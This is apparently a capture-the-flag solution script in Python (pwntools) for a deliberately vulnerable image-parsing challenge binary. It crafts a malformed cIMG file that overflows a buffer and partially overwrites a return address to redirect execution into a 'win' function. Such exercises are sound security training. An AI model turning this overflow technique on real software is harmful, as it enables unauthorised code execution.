#!/usr/bin/python3

from pwn import *
import struct

context.log_level = 'error' 
context.terminal = ["tmux","splitw","-h"]
elf = context.binary = ELF("/challenge/integration-cimg-screenshot-win")

code = 1337
directive = []
sprite_id = 0

def header(w,h,dir):
    return b"cIMG" + struct.pack("<HBBI",4,w,h,dir)

def make_sprite(id,w,h,data):
    global directive
    payload = struct.pack("<HBBB",3,id,w,h) +data
    directive.append(payload)

def load_sprite_from_file(id,w,h,n):
    global directive
    payload = struct.pack("<HBBB",5,id,w,h)+n+b"\x00"*(0x102 - len(n) - 3)
    directive.append(payload)

def send_to_framebuffer(id,color,x,y,rw,rh,sc):
    r,g,b = color
    global directive
    payload = struct.pack("<HBBBBBBBBB",4,id,r,g,b,x,y,rw,rh,ord(sc))
    directive.append(payload)

def get_shellcode():
    with open("/home/hacker/exploit/shellcode_raw","rb") as file:
        shellcode = file.read()
    return shellcode

shellcode = get_shellcode()

offset = 168
"""we need to overwrite the ret add but when we do that to call win functions the stack addres which is used by win function to store the flag is also overwrite so we need to jump in that part f win function where the rbp is restore so that part is mov rbp, rsp add is 0x403b42 
reminder that addres last 2 byte mmust also be in range of 0x20 to 0x7e so this is the chosen place to land from handle_1337here b=0x42 ;=0x3b"""
payload  = cyclic(offset) + b"B;"
width = 17
height = 10
make_sprite(sprite_id,width,height,payload)
   
send_to_framebuffer(sprite_id,(255,255,255),0,0,1,1," ")

screenshot = struct.pack("<HBBBBB",code,sprite_id,0,0,width,height)
directive.append(screenshot)

payload = header(width,height,len(directive))+b"".join(directive)

with open("image.cimg","wb") as file:
    file.write(payload)

io = process(["/challenge/integration-cimg-screenshot-win","/home/hacker/image.cimg"])
io.interactive()
